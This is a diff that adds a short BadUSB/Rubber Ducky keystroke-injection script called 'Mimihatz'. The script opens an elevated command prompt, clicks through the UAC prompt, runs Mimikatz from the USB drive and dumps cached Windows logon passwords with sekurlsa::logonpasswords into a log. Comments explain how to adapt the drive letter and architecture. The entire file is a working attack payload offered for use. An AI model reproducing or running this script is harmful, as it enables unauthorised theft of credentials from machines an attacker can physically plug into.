@@ -1,0 +1,37 @@
+REM Mimihatz
+REM By: DeDogeGod
+DELAY 200
+GUI r
+DELAY 200
+REM Admin Bypass
+STRING powershell Start-Process cmd -Verb runAs 
+DELAY 100
+ENTER
+DELAY 1650
+LEFTARROW
+ENTER
+DELAY 250
+REM Opening Mimikatz
+REM Change to your usb's letter and keep the ":"
+STRING D:
+ENTER
+REM If you are attacking a win32 bit version change this
+STRING cd x64
+ENTER
+STRING m.exe
+ENTER
+REM Mimikatz Code for Password
+DELAY 100
+STRING privilege::debug
+ENTER
+STRING log
+ENTER
+DELAY 100
+STRING sekurlsa::logonpasswords
+ENTER
+DELAY 360
+STRING exit
+ENTER
+DELAY 200
+STRING exit
+ENTER
